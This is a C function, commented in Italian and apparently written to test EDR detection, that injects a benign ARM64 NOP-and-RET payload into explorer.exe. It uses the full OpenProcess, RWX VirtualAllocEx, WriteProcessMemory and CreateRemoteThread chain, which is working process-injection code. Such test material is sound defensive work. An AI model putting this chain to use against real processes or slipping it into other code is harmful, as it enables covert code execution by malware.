/* InjectExplorer: catena API per iniezione di codice in explorer.exe.
   Il segnale per gli EDR non e' il payload (benigno) ma il pattern API:
   OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD)
   + VirtualAllocEx(RWX) + WriteProcessMemory + CreateRemoteThread.        */
__declspec(noinline) BOOL WINAPI InjectExplorer(LPVOID param) {
    /* Traccia lo stack user-mode all'ingresso: visione per CaptureStackBackTrace */
    void *backtrace[12];
    USHORT frames = CaptureStackBackTrace(0, 12, backtrace, NULL);
    /* ... risoluzione simbolica e stampa backtrace ... */

    /* [1] Trova il PID di explorer.exe tramite snapshot processi */
    DWORD explorerPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, L"explorer.exe") == 0)
                explorerPid = pe.th32ProcessID;
        } while (!explorerPid && Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    /* [2] Apre il processo con diritti di scrittura e creazione thread */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, explorerPid);

    /* [3] Alloca una pagina RWX nel processo target */
    LPVOID remMem = VirtualAllocEx(hProc, NULL, 4096,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);

    /* [4] Payload ARM64 benigno: 3 x NOP + RET (16 byte) */
    BYTE payload[] = {
        0x1F, 0x20, 0x03, 0xD5,  /* NOP */
        0x1F, 0x20, 0x03, 0xD5,  /* NOP */
        0x1F, 0x20, 0x03, 0xD5,  /* NOP */
        0xC0, 0x03, 0x5F, 0xD6   /* RET */
    };
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remMem, payload, sizeof(payload), &written);

    /* [5] Crea un thread remoto che esegue il payload in explorer.exe */
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remMem,
                                        NULL, 0, NULL);
    WaitForSingleObject(hThread, 2000);
    VirtualFreeEx(hProc, remMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}
